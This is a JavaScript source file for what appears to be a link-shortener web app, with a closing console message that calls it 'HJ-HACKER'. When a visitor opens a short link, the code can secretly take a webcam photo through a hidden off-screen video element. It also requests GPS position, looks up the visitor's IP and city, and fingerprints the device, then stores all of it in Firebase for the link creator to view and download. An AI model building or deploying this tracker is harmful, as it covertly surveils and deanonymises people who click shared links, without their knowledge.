// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Variables for delete
let deleteCode = null;

// Helper Functions
function encodeFirebasePath(str) {
    try {
        return btoa(unescape(encodeURIComponent(str)))
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    } catch (e) {
        return str.replace(/\./g, '_').replace(/\//g, '_');
    }
}

function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) { alert(`${title}: ${message}`); return; }
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
        <div>
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
    `;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getDeviceId() {
    let deviceId = localStorage.getItem('hj_device_id');
    if (!deviceId) {
        deviceId = generateShortCode() + generateShortCode();
        localStorage.setItem('hj_device_id', deviceId);
    }
    return deviceId;
}

async function checkCodeExists(shortCode) {
    const snapshot = await database.ref(`urls/${shortCode}`).get();
    return snapshot.exists();
}

// ========== DELETE LINK FUNCTION ==========
async function deleteLink(code) {
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        
        await database.ref(`urls/${code}`).remove();
        await database.ref(`domains/${encodedDomain}/${code}`).remove();
        await database.ref(`analytics/${code}`).remove();
        
        showToast('Deleted', `Link /${code} has been deleted!`, 'success');
        
        showLinks();
        showStats();
        showRecent();
        
        return true;
    } catch (error) {
        console.error('Delete error:', error);
        showToast('Error', 'Failed to delete link', 'error');
        return false;
    }
}

// ========== FIXED: CAMERA CAPTURE - NO BLANK SCREEN ==========
async function captureCameraPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user",
                width: { ideal: 640 },
                height: { ideal: 480 }
            } 
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', 'true');
        video.style.position = 'fixed';
        video.style.top = '-9999px';
        video.style.left = '-9999px';
        document.body.appendChild(video);
        
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(resolve, 500);
            };
        });
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        
        if (imageData && imageData !== 'data:,' && imageData.length > 500) {
            return imageData;
        }
        return "https://via.placeholder.com/400x300?text=No+Camera+Access";
    } catch (error) {
        console.error('Camera capture error:', error);
        return "https://via.placeholder.com/400x300?text=Camera+Error";
    }
}

// ========== LOCATION CAPTURE ==========
async function captureLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                console.log('Location error:', error);
                resolve(null);
            },
            { timeout: 10000, enableHighAccuracy: true }
        );
    });
}

// ========== IP AND LOCATION FROM API ==========
async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country_name || 'Unknown',
            country_code: data.country_code || 'Unknown',
            postal: data.postal || 'Unknown',
            latitude: data.latitude || null,
            longitude: data.longitude || null,
            timezone: data.timezone || 'Unknown'
        };
    } catch (error) {
        console.log('IP API error:', error);
        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
    }
}

// ========== COMPLETE DEVICE INFORMATION ==========
async function getAdvancedDeviceInfo() {
    const info = {
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || 'en-US',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
        screen_width: screen.width || window.innerWidth,
        screen_height: screen.height || window.innerHeight,
        browser: 'Unknown',
        os: 'Unknown',
        device_model: 'Unknown'
    };
    
    const ua = navigator.userAgent;
    if (ua.includes('Chrome') && !ua.includes('Edg')) info.browser = 'Chrome';
    else if (ua.includes('Firefox')) info.browser = 'Firefox';
    else if (ua.includes('Safari') && !ua.includes('Chrome')) info.browser = 'Safari';
    else if (ua.includes('Edg')) info.browser = 'Edge';
    
    if (ua.includes('iPhone')) {
        info.device_model = 'iPhone';
        info.os = 'iOS';
    } else if (ua.includes('iPad')) {
        info.device_model = 'iPad';
        info.os = 'iOS';
    } else if (ua.includes('Android')) {
        info.device_model = 'Android';
        info.os = 'Android';
        if (ua.includes('SM-')) info.device_brand = 'Samsung';
        else if (ua.includes('MI')) info.device_brand = 'Xiaomi';
        else if (ua.includes('Pixel')) info.device_brand = 'Google';
    } else if (ua.includes('Windows')) {
        info.device_model = 'Windows PC';
        info.os = 'Windows';
    } else if (ua.includes('Mac')) {
        info.device_model = 'Mac';
        info.os = 'macOS';
    }
    
    if (navigator.deviceMemory) info.device_memory = navigator.deviceMemory + ' GB';
    if (navigator.connection) info.connection_type = navigator.connection.effectiveType;
    
    return info;
}

// Main Shorten Function
async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) {
        showToast('Error', 'Please enter a URL', 'error');
        return;
    }
    
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) {
        urlToShorten = 'https://' + urlToShorten;
    }
    
    try {
        new URL(urlToShorten);
    } catch {
        showToast('Error', 'Invalid URL', 'error');
        return;
    }
    
    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    
    const exists = await checkCodeExists(shortCode);
    if (exists) {
        showToast('Error', `Code "${shortCode}" already taken`, 'error');
        return;
    }
    
    const hasPassword = document.getElementById('passwordToggle').checked;
    const password = hasPassword ? document.getElementById('password').value : null;
    const hasSocialGate = document.getElementById('socialToggle').checked;
    const socialIcon = document.getElementById('socialIcon')?.value || 'youtube';
    const socialTitle = hasSocialGate ? document.getElementById('socialTitle')?.value : null;
    const socialUrl = hasSocialGate ? document.getElementById('socialUrl')?.value : null;
    const socialDesc = hasSocialGate ? document.getElementById('socialDesc')?.value : null;
    const socialButton = hasSocialGate ? document.getElementById('socialButton')?.value : null;
    const animation = document.querySelector('input[name="animation"]:checked')?.value || 'ring';
    const cameraCapture = document.getElementById('captureCamera')?.checked || false;
    const locationCapture = document.getElementById('captureLocation')?.checked || false;
    
    if (hasPassword && !password) {
        showToast('Error', 'Please enter a password', 'error');
        return;
    }
    
    if (hasSocialGate && (!socialTitle || !socialUrl)) {
        showToast('Error', 'Please fill social gate details', 'error');
        return;
    }
    
    showLoading(true);
    
    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        const createdAt = new Date().toISOString();
        const encodedDomain = encodeFirebasePath(domain);
        
        const linkData = {
            long_url: urlToShorten,
            domain: domain,
            created_at: createdAt,
            device_id: deviceId,
            clicks: 0
        };
        
        if (password) linkData.password = password;
        if (socialTitle) linkData.social_gate_title = socialTitle;
        if (socialUrl) linkData.social_gate_url = socialUrl;
        if (socialIcon) linkData.social_gate_icon = socialIcon;
        if (socialDesc) linkData.social_gate_description = socialDesc;
        if (socialButton) linkData.social_gate_button_text = socialButton;
        if (animation) linkData.animation_type = animation;
        if (cameraCapture) linkData.capture_camera = true;
        if (locationCapture) linkData.capture_location = true;
        
        await database.ref(`urls/${shortCode}`).set(linkData);
        await database.ref(`domains/${encodedDomain}/${shortCode}`).set(linkData);
        
        const shortUrl = `${window.location.origin}/${shortCode}`;
        
        const shortLinkSpan = document.getElementById('shortLink');
        const resultDiv = document.getElementById('result');
        const qrCodeDiv = document.getElementById('qrCode');
        
        if (shortLinkSpan) shortLinkSpan.textContent = shortUrl;
        if (resultDiv) resultDiv.classList.remove('hidden');
        
        if (typeof QRCode !== 'undefined' && qrCodeDiv) {
            qrCodeDiv.innerHTML = '';
            new QRCode(qrCodeDiv, {
                text: shortUrl,
                width: 100,
                height: 100,
                colorDark: "#00ff41",
                colorLight: "#000000"
            });
        }
        
        showToast('Success', 'Link created successfully!', 'success');
        
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        document.getElementById('passwordToggle').checked = false;
        document.getElementById('socialToggle').checked = false;
        const passwordSection = document.getElementById('passwordSection');
        const socialSection = document.getElementById('socialSection');
        if (passwordSection) passwordSection.classList.add('hidden');
        if (socialSection) socialSection.classList.add('hidden');
        if (document.getElementById('password')) document.getElementById('password').value = '';
        
        showLinks();
        showStats();
        showRecent();
        
        resultDiv?.scrollIntoView({ behavior: 'smooth', block: 'center' });
        
    } catch (error) {
        console.error('Error:', error);
        showToast('Error', error.message || 'An error occurred', 'error');
    } finally {
        showLoading(false);
    }
}

function showLoading(show) {
    const loading = document.getElementById('loading');
    const btn = document.getElementById('shortenBtn');
    if (show) {
        if (loading) loading.classList.remove('hidden');
        if (btn) btn.disabled = true;
    } else {
        if (loading) loading.classList.add('hidden');
        if (btn) btn.disabled = false;
    }
}

// ========== DATA DISPLAY FUNCTIONS ==========
function updateDisplay(title, icon, contentHtml) {
    const headerIcon = document.getElementById('dataDisplayHeader')?.querySelector('i');
    const headerTitle = document.getElementById('dataDisplayTitle');
    const contentDiv = document.getElementById('dataDisplayContent');
    
    if (headerIcon) headerIcon.className = `fas ${icon}`;
    if (headerTitle) headerTitle.textContent = title;
    if (contentDiv) contentDiv.innerHTML = contentHtml;
}

// LINKS - Show all created links
async function showLinks() {
    updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading links...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const links = [];
        
        snapshot.forEach(child => {
            links.push({ code: child.key, ...child.val() });
        });
        
        if (links.length === 0) {
            updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-inbox"></i><p>No links created yet</p><small>Create your first link above</small></div>');
            return;
        }
        
        const html = links.map(link => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${link.code}</span>
                    <span class="data-item-date"><i class="fas fa-calendar-alt"></i> ${new Date(link.created_at).toLocaleDateString()}</span>
                </div>
                <div class="data-item-url"><i class="fas fa-globe"></i> ${link.long_url?.substring(0, 60)}${link.long_url?.length > 60 ? '...' : ''}</div>
                <div class="data-item-stats">
                    <span><i class="fas fa-mouse-pointer"></i> Clicks: ${link.clicks || 0}</span>
                    ${link.password ? '<span><i class="fas fa-lock"></i> Password</span>' : ''}
                    ${link.social_gate_url ? '<span><i class="fas fa-share-alt"></i> Social Gate</span>' : ''}
                    ${link.capture_camera ? '<span><i class="fas fa-camera"></i> Camera</span>' : ''}
                </div>
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="copyToClipboard('${window.location.origin}/${link.code}')"><i class="fas fa-copy"></i> Copy</button>
                    <button class="data-btn-sm" onclick="viewAnalytics('${link.code}')"><i class="fas fa-chart-line"></i> Data</button>
                    <button class="data-btn-sm" onclick="confirmDelete('${link.code}')" style="background: rgba(255,68,68,0.2); border-color: #ff4444;"><i class="fas fa-trash-alt"></i> Delete</button>
                </div>
            </div>
        `).join('');
        
        updateDisplay('YOUR LINKS', 'fa-link', html);
    } catch (error) {
        console.error(error);
        updateDisplay('YOUR LINKS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading links</p></div>');
    }
}

// STATS - Show overall statistics
async function showStats() {
    updateDisplay('STATISTICS', 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading stats...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        let totalClicks = 0, totalLinks = 0;
        
        for (const [code, data] of Object.entries(snapshot.val() || {})) {
            totalClicks += data.clicks || 0;
            totalLinks++;
        }
        
        const html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${totalLinks}</div><div class="stat-label"><i class="fas fa-link"></i> Total Links</div></div>
                <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div></div>
            </div>
        `;
        
        updateDisplay('STATISTICS', 'fa-chart-line', html);
    } catch (error) {
        console.error(error);
        updateDisplay('STATISTICS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading stats</p></div>');
    }
}

// RECENT - Show recent visitors with camera photos
async function showRecent() {
    updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading recent activity...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const allVisitors = [];
        
        for (const [code] of Object.entries(snapshot.val() || {})) {
            const analyticsSnapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(30).get();
            analyticsSnapshot.forEach(analytic => {
                const data = analytic.val();
                allVisitors.push({
                    code: code,
                    ip: data.ip_address,
                    device_model: data.device_model,
                    os: data.os,
                    browser: data.browser,
                    timestamp: data.created_at,
                    camera: data.captured_image,
                    city: data.city,
                    country: data.country
                });
            });
        }
        
        allVisitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const recent = allVisitors.slice(0, 15);
        
        if (recent.length === 0) {
            updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-clock"></i><p>No recent activity</p><small>Share your links to see visitor data</small></div>');
            return;
        }
        
        const html = recent.map(v => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${v.code}</span>
                    <span class="data-item-date"><i class="fas fa-clock"></i> ${new Date(v.timestamp).toLocaleString()}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-globe"></i> ${v.ip || 'Unknown'}</span>
                </div>
                <div class="data-item-stats">
                    <span><i class="fas fa-mobile-alt"></i> ${v.device_model || v.os || 'Unknown'}</span>
                    <span><i class="fab fa-${v.browser?.toLowerCase() || 'chrome'}"></i> ${v.browser || 'Unknown'}</span>
                </div>
                ${v.city ? `<div class="data-item-stats"><i class="fas fa-map-marker-alt"></i> ${v.city}${v.country ? `, ${v.country}` : ''}</div>` : ''}
                ${v.camera ? `<div class="data-item-stats" style="color: #00ff41;"><i class="fas fa-camera"></i> Photo captured! <button class="data-btn-sm" onclick="viewPhoto('${v.camera.replace(/'/g, "\\'")}')"><i class="fas fa-eye"></i> View Photo</button></div>` : ''}
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="viewAnalytics('${v.code}')"><i class="fas fa-chart-line"></i> View Full Data</button>
                </div>
            </div>
        `).join('');
        
        updateDisplay('RECENT ACTIVITY', 'fa-history', html);
    } catch (error) {
        console.error(error);
        updateDisplay('RECENT ACTIVITY', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading recent data</p></div>');
    }
}

// View Photo Modal
window.viewPhoto = (imageData) => {
    const modal = document.getElementById('photoModal');
    const img = document.getElementById('photoModalImage');
    if (modal && img && imageData) {
        img.src = imageData;
        modal.classList.remove('hidden');
    } else {
        showToast('Error', 'No valid photo available', 'error');
    }
};

function closePhotoModal() {
    const modal = document.getElementById('photoModal');
    if (modal) modal.classList.add('hidden');
}

function downloadPhoto() {
    const img = document.getElementById('photoModalImage');
    if (img && img.src && img.src !== '') {
        const link = document.createElement('a');
        link.download = 'captured_photo_' + Date.now() + '.jpg';
        link.href = img.src;
        link.click();
        showToast('Success', 'Photo downloaded!', 'success');
    }
}

// Confirm Delete
window.confirmDelete = (code) => {
    deleteCode = code;
    const deleteLinkCodeSpan = document.getElementById('deleteLinkCode');
    if (deleteLinkCodeSpan) {
        deleteLinkCodeSpan.textContent = `/${code}?`;
    }
    const modal = document.getElementById('deleteModal');
    if (modal) modal.classList.remove('hidden');
};

// Execute Delete
window.executeDelete = async () => {
    if (deleteCode) {
        await deleteLink(deleteCode);
        deleteCode = null;
        const modal = document.getElementById('deleteModal');
        if (modal) modal.classList.add('hidden');
    }
};

// Cancel Delete
window.cancelDelete = () => {
    deleteCode = null;
    const modal = document.getElementById('deleteModal');
    if (modal) modal.classList.add('hidden');
};

// View Analytics for specific link
window.viewAnalytics = async (code) => {
    updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading analytics...</p></div>');
    
    try {
        const snapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(100).get();
        const analytics = [];
        snapshot.forEach(child => { analytics.push({ id: child.key, ...child.val() }); });
        analytics.reverse();
        
        const linkSnapshot = await database.ref(`urls/${code}`).get();
        const linkData = linkSnapshot.val();
        
        const totalClicks = analytics.length;
        
        let html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div></div>
            </div>
            <div style="margin-bottom: 12px; padding: 8px; background: rgba(0,0,0,0.3); border-radius: 8px;">
                <div style="font-size: 0.7rem;"><i class="fas fa-link"></i> ${linkData?.long_url || 'N/A'}</div>
            </div>
        `;
        
        if (analytics.length === 0) {
            html += '<div class="empty-data"><i class="fas fa-inbox"></i><p>No visitors yet. Share your link!</p></div>';
        } else {
            html += `<h4 style="font-size: 0.75rem; margin: 12px 0 8px;"><i class="fas fa-list-ul"></i> Visitor Details (${analytics.length} records)</h4>`;
            html += analytics.map(v => `
                <div class="data-item">
                    <div class="data-item-header">
                        <span><i class="fas fa-globe"></i> ${v.ip_address || 'Unknown'}</span>
                        <span class="data-item-date"><i class="fas fa-calendar-alt"></i> ${new Date(v.created_at).toLocaleString()}</span>
                    </div>
                    <div class="data-item-stats"><strong><i class="fas fa-mobile-alt"></i> Device:</strong> ${v.device_model || v.os || 'Unknown'}</div>
                    <div class="data-item-stats"><strong><i class="fab fa-${v.browser?.toLowerCase() || 'chrome'}"></i> Browser:</strong> ${v.browser || 'Unknown'} | <strong>OS:</strong> ${v.os || 'Unknown'}</div>
                    ${v.city ? `<div class="data-item-stats"><strong><i class="fas fa-map-marker-alt"></i> Location:</strong> ${v.city}${v.country ? `, ${v.country}` : ''}</div>` : ''}
                    ${v.captured_image && v.captured_image !== 'black_screen' ? `<div class="data-item-stats" style="color: #00ff41;"><i class="fas fa-camera"></i> Photo captured! <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image.replace(/'/g, "\\'")}')"><i class="fas fa-eye"></i> View</button></div>` : ''}
                </div>
            `).join('');
        }
        
        updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', html);
        showToast('Success', `Loaded ${analytics.length} records!`, 'success');
    } catch (error) {
        console.error(error);
        updateDisplay('ERROR', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading analytics</p></div>');
        showToast('Error', 'Failed to load analytics', 'error');
    }
};

window.copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showToast('Copied', 'Link copied!', 'success');
};

// Visitor Redirect Handler (for short links)
async function handleVisitorRedirect() {
    const path = window.location.pathname;
    if (path === '/' || path === '/index.html') return;
    
    const shortCode = path.substring(1);
    if (!shortCode) return;
    
    try {
        const snapshot = await database.ref(`urls/${shortCode}`).get();
        if (!snapshot.exists()) return;
        
        const linkData = snapshot.val();
        
        // Capture data
        let cameraImg = null;
        let locationData = null;
        
        if (linkData.capture_camera) {
            cameraImg = await captureCameraPhoto();
        }
        if (linkData.capture_location) {
            locationData = await captureLocation();
        }
        
        const ipInfo = await getIPInfo();
        const deviceInfo = await getAdvancedDeviceInfo();
        
        const analyticsData = {
            created_at: new Date().toISOString(),
            ip_address: ipInfo.ip,
            city: ipInfo.city,
            country: ipInfo.country,
            latitude: ipInfo.latitude,
            longitude: ipInfo.longitude,
            captured_image: cameraImg,
            gps_location: locationData,
            ...deviceInfo
        };
        
        await database.ref(`analytics/${shortCode}`).push(analyticsData);
        await database.ref(`urls/${shortCode}/clicks`).transaction(c => (c || 0) + 1);
        
        // Check for password protection
        if (linkData.password) {
            sessionStorage.setItem(`pending_link_${shortCode}`, linkData.long_url);
            sessionStorage.setItem(`pending_password_${shortCode}`, linkData.password);
            showPasswordModal(shortCode);
            return;
        }
        
        // Check for social gate
        if (linkData.social_gate_url) {
            sessionStorage.setItem(`pending_link_${shortCode}`, linkData.long_url);
            showSocialModal(linkData);
            return;
        }
        
        // Redirect normally
        window.location.href = linkData.long_url;
        
    } catch (error) {
        console.error('Redirect error:', error);
    }
}

function showPasswordModal(code) {
    const modal = document.getElementById('passwordModal');
    const input = document.getElementById('modalPassword');
    const errorDiv = document.getElementById('modalError');
    
    if (!modal) return;
    
    modal.classList.remove('hidden');
    
    const unlockBtn = document.getElementById('modalUnlock');
    const cancelBtn = document.getElementById('modalCancel');
    
    const checkPassword = () => {
        const entered = input.value;
        const storedPw = sessionStorage.getItem(`pending_password_${code}`);
        const targetUrl = sessionStorage.getItem(`pending_link_${code}`);
        
        if (entered === storedPw) {
            sessionStorage.removeItem(`pending_password_${code}`);
            sessionStorage.removeItem(`pending_link_${code}`);
            modal.classList.add('hidden');
            window.location.href = targetUrl;
        } else {
            errorDiv.classList.remove('hidden');
            errorDiv.textContent = 'Incorrect password!';
        }
    };
    
    unlockBtn.onclick = checkPassword;
    cancelBtn.onclick = () => {
        modal.classList.add('hidden');
        window.location.href = '/';
    };
    
    input.onkeypress = (e) => {
        if (e.key === 'Enter') checkPassword();
    };
}

function showSocialModal(linkData) {
    const modal = document.getElementById('socialModal');
    if (!modal) return;
    
    const iconDiv = document.getElementById('socialModalIcon');
    const titleEl = document.getElementById('socialModalTitle');
    const descEl = document.getElementById('socialModalDesc');
    const btnEl = document.getElementById('socialModalBtn');
    
    const icon = linkData.social_gate_icon || 'youtube';
    iconDiv.innerHTML = `<i class="fab fa-${icon}" style="font-size: 48px; color: #ff4444;"></i>`;
    titleEl.textContent = linkData.social_gate_title || 'Follow to Unlock';
    descEl.textContent = linkData.social_gate_description || 'Complete the action below to continue';
    btnEl.textContent = linkData.social_gate_button_text || 'Verify & Continue';
    
    modal.classList.remove('hidden');
    
    btnEl.onclick = () => {
        window.open(linkData.social_gate_url, '_blank');
        setTimeout(() => {
            const targetUrl = sessionStorage.getItem(`pending_link_${window.location.pathname.substring(1)}`);
            if (targetUrl) {
                sessionStorage.removeItem(`pending_link_${window.location.pathname.substring(1)}`);
                window.location.href = targetUrl;
            }
        }, 3000);
    };
}

// Bottom Navigation
document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.bottom-nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        if (tab === 'create') {
            document.getElementById('createCard').scrollIntoView({ behavior: 'smooth' });
            updateDisplay('Click any button to view data', 'fa-fingerprint', 
                '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Tap LINKS, STATS, or RECENT below</p></div>');
        } else if (tab === 'links') {
            showLinks();
        } else if (tab === 'stats') {
            showStats();
        } else if (tab === 'recent') {
            showRecent();
        }
    });
});

// Toggle handlers
const passwordToggle = document.getElementById('passwordToggle');
if (passwordToggle) {
    passwordToggle.addEventListener('change', (e) => {
        const section = document.getElementById('passwordSection');
        if (section) section.classList.toggle('hidden');
    });
}

const socialToggle = document.getElementById('socialToggle');
if (socialToggle) {
    socialToggle.addEventListener('change', (e) => {
        const section = document.getElementById('socialSection');
        if (section) section.classList.toggle('hidden');
    });
}

// Icon selector
document.querySelectorAll('.icon-option').forEach(icon => {
    icon.addEventListener('click', () => {
        document.querySelectorAll('.icon-option').forEach(i => i.classList.remove('active'));
        icon.classList.add('active');
        const socialIconInput = document.getElementById('socialIcon');
        if (socialIconInput) socialIconInput.value = icon.dataset.icon;
    });
});

// Advanced toggle
const advancedToggle = document.getElementById('advancedToggle');
if (advancedToggle) {
    advancedToggle.addEventListener('click', () => {
        const content = document.getElementById('advancedContent');
        const icon = document.querySelector('#advancedToggle .fa-chevron-down');
        if (content) content.classList.toggle('hidden');
        if (icon) icon.style.transform = content?.classList.contains('hidden') ? 'rotate(0deg)' : 'rotate(180deg)';
    });
}

// Delete modal listeners
const confirmDeleteBtn = document.getElementById('confirmDeleteBtn');
const cancelDeleteBtn = document.getElementById('cancelDeleteBtn');

if (confirmDeleteBtn) confirmDeleteBtn.addEventListener('click', executeDelete);
if (cancelDeleteBtn) cancelDeleteBtn.addEventListener('click', cancelDelete);

// Photo modal listeners
const closePhotoModalBtn = document.getElementById('closePhotoModal');
const closePhotoModalBtn2 = document.getElementById('closePhotoModalBtn');
const downloadPhotoBtn = document.getElementById('downloadPhotoBtn');

if (closePhotoModalBtn) closePhotoModalBtn.addEventListener('click', closePhotoModal);
if (closePhotoModalBtn2) closePhotoModalBtn2.addEventListener('click', closePhotoModal);
if (downloadPhotoBtn) downloadPhotoBtn.addEventListener('click', downloadPhoto);

// Close modals on outside click
window.addEventListener('click', (e) => {
    const photoModal = document.getElementById('photoModal');
    const deleteModal = document.getElementById('deleteModal');
    const passwordModal = document.getElementById('passwordModal');
    const socialModal = document.getElementById('socialModal');
    if (e.target === photoModal) closePhotoModal();
    if (e.target === deleteModal) cancelDelete();
    if (e.target === passwordModal) document.getElementById('passwordModal')?.classList.add('hidden');
    if (e.target === socialModal) document.getElementById('socialModal')?.classList.add('hidden');
});

// Event listeners
const shortenBtn = document.getElementById('shortenBtn');
if (shortenBtn) shortenBtn.addEventListener('click', shortenUrl);

const copyBtn = document.getElementById('copyBtn');
if (copyBtn) {
    copyBtn.addEventListener('click', () => {
        const link = document.getElementById('shortLink')?.textContent;
        if (link) copyToClipboard(link);
    });
}

// Initialize visitor redirect handler
handleVisitorRedirect();

console.log('🔥 HJ-HACKER Loaded with all fixes!');
